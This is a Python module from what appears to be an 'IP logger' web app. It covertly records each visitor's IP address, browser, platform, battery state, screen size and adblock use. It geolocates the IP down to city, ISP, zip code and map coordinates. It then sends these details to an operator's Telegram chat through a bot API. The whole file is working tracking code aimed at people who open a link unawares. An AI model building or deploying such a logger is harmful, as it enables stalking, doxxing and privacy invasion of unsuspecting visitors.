import datetime
import json
import time

import requests
from ua_parser import user_agent_parser
from werkzeug.user_agent import UserAgent
from werkzeug.utils import cached_property
from werkzeug.routing import BaseConverter

from app.config import Config


class ParsedUserAgent(UserAgent):
    @cached_property
    def _details(self):
        return user_agent_parser.Parse(self.string)

    @property
    def platform(self):
        return self._details['os']['family']

    @property
    def browser(self):
        return self._details['user_agent']['family']

    @property
    def version(self):
        return '.'.join(
            part
            for key in ('major', 'minor', 'patch')
            if (part := self._details['user_agent'][key]) is not None
        )


class LoggerLog:
    def __init__(self, *, ip_address: str, receiver_tg_id: int, user_agent: str):
        self.last_response = time.time()
        self.user_agent = user_agent
        self.ip_address = ip_address
        self.receiver_tg_id = receiver_tg_id
        self.data = self.get_main_info()

    def get_main_info(self) -> dict[str, str]:
        url = f"http://ip-api.com/json/{self.ip_address}?fields=16969727"
        response = requests.get(url)
        data = json.loads(response.text)
        parsed_ua = ParsedUserAgent(self.user_agent)
        data["browser"] = f"{parsed_ua.browser} {parsed_ua.version}"
        data["platform"] = parsed_ua.platform
        return data

    def get_main_log(self) -> str:
        return f"""❗A new visitor on logger❗
<b>Time:</b> {datetime.datetime.today().strftime("%Y-%m-%d-%H:%M:%S")}
<b>IP:</b> {self.ip_address}
____________________
<b>Browser:</b> {self.data["browser"]}
<b>Platform:</b> {self.data["platform"]}
<b>Country:</b> {self.data["country"]}
<b>Country code:</b> {self.data["countryCode"]}
<b>Region:</b> {self.data["regionName"]}
<b>City:</b> {self.data["city"]}
<b>Timezone:</b> {self.data["timezone"]}
<b>Proxy/VPN:</b> {self.data["proxy"]}
<b>Hosting:</b> {self.data["hosting"]}
<b>Organization:</b> {self.data["org"]}
<b>Internet provider:</b> {self.data["isp"]}
<b>Zip code:</b> {self.data["zip"]}
<b>Coordinates:</b> <a href="https://maps.google.com/maps?q=%40{self.data["lat"]},{self.data["lon"]}">{self.data["lat"]}, {self.data["lon"]}</a>
""" \
            .replace("None", "Undetected") \
            .replace("True", "Yes") \
            .replace("False", "No")

    def get_second_log(self) -> str:
        return f""" Additional info about {self.ip_address}
____________________
<b>Screen resolution:</b> {self.data["screen_width"]}x{self.data["screen_height"]}
<b>Browser window resolution:</b> {self.data["client_width"]}x{self.data["client_height"]}
<b>Charging percent:</b> {self.data["charging_percent"]}
<b>Charging status:</b> {self.data["charging_status"]}
<b>Charging time:</b> {self.data["charging_time"]}
<b>Discharging time:</b> {self.data["discharging_time"]}
<b>AdBlock existing:</b> {self.data["adblock"]}""" \
            .replace("None", "undetected") \
            .replace("True", "Yes") \
            .replace("False", "No")

    def send_message(self, msg) -> None:
        requests.get(
            f"https://api.telegram.org/bot{Config.API_TOKEN}/sendMessage",
            data={"text": msg, "chat_id": self.receiver_tg_id, "parse_mode": "HTML"}
        )


class RegexConverter(BaseConverter):
    def __init__(self, url_map, *items):
        super(RegexConverter, self).__init__(url_map)
        self.regex = items[0]
